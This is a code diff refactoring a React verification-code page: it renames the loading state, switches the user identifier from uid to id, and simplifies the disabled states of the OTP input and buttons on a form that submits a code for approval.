@@ -34,7 +34,7 @@ export default function VerifyCodePage() {
     });
 
     const [submission, setSubmission] = useState<Submission | null>(null);
-    const [isLoading, setIsLoading] = useState(true);
+    const [isPageLoading, setIsPageLoading] = useState(true);
 
     const [countdown, setCountdown] = useState(30);
     const [canResend, setCanResend] = useState(false);
@@ -42,10 +42,10 @@ export default function VerifyCodePage() {
     const isPending = submission?.verificationCodeStatus === 'pending' && !!submission.verificationCode;
 
     const fetchSubmission = useCallback(async () => {
-        if (!user) return;
-        setIsLoading(true);
+        if (!user?.id) return;
+        setIsPageLoading(true);
         try {
-            const res = await fetch(`/api/submissions?id=${user.uid}`);
+            const res = await fetch(`/api/submissions?id=${user.id}`);
             if (res.status === 404) {
                 toast({ variant: 'destructive', title: 'Error', description: 'Submission not found. Redirecting...' });
                 router.replace('/start');
@@ -70,13 +70,15 @@ export default function VerifyCodePage() {
         } catch (err: any) {
             toast({ variant: 'destructive', title: 'Error', description: err.message });
         } finally {
-            setIsLoading(false);
+            setIsPageLoading(false);
         }
-    }, [user, router, toast, form]);
+    }, [user?.id, router, toast, form]);
 
     useEffect(() => {
         if(user) {
             fetchSubmission();
+        } else {
+            setIsPageLoading(false);
         }
     }, [user, fetchSubmission]);
     
@@ -122,13 +124,13 @@ export default function VerifyCodePage() {
     
     const onSubmit = async (values: FormValues) => {
         if (!user) return toast({ variant: 'destructive', title: 'Error', description: 'You must be logged in.' });
-        setIsLoading(true);
+        
         try {
              const response = await fetch('/api/submissions', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    id: user.uid,
+                    id: user.id,
                     step: 'verificationCode',
                     data: values.verificationCode,
                 }),
@@ -141,15 +143,13 @@ export default function VerifyCodePage() {
             await fetchSubmission(); // Refetch to get the pending state
         } catch (err: any) {
             toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
-        } finally {
-            setIsLoading(false);
         }
     };
     
     const { isSubmitting } = formState;
     const isRejected = submission?.verificationCodeStatus === 'rejected';
 
-    if (isLoading && !submission) {
+    if (isPageLoading) {
         return <div className="flex justify-center items-center h-full"><Loader2 className="animate-spin h-8 w-8 text-primary" /></div>
     }
 
@@ -195,7 +195,7 @@ export default function VerifyCodePage() {
                             <FormItem>
                             <FormControl>
                                 <div className="flex justify-center">
-                                <InputOTP maxLength={6} {...field} disabled={isLoading || isSubmitting || isPending}>
+                                <InputOTP maxLength={6} {...field} disabled={isSubmitting || isPending}>
                                     <InputOTPGroup>
                                         <InputOTPSlot index={0} />
                                         <InputOTPSlot index={1} />
@@ -225,11 +225,11 @@ export default function VerifyCodePage() {
                     )}
                     
                     <div className="flex justify-between pt-4">
-                         <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()} disabled={isLoading || isSubmitting || isPending}>
+                         <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()} disabled={isSubmitting || isPending}>
                             <ArrowLeft className="mr-2 h-5 w-5" />
                             Back
                         </Button>
-                        <Button type="submit" size="lg" className="rounded-full" disabled={isLoading || isSubmitting || isPending}>
+                        <Button type="submit" size="lg" className="rounded-full" disabled={isSubmitting || isPending}>
                             {(isSubmitting || isPending) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                             {isPending ? 'Waiting for Approval...' : 'Submit for Approval'}
                              {!isPending && <ArrowRight className="ml-2 h-5 w-5" />}
@@ -240,5 +240,3 @@ export default function VerifyCodePage() {
         </div>
     );
 }
-
-    
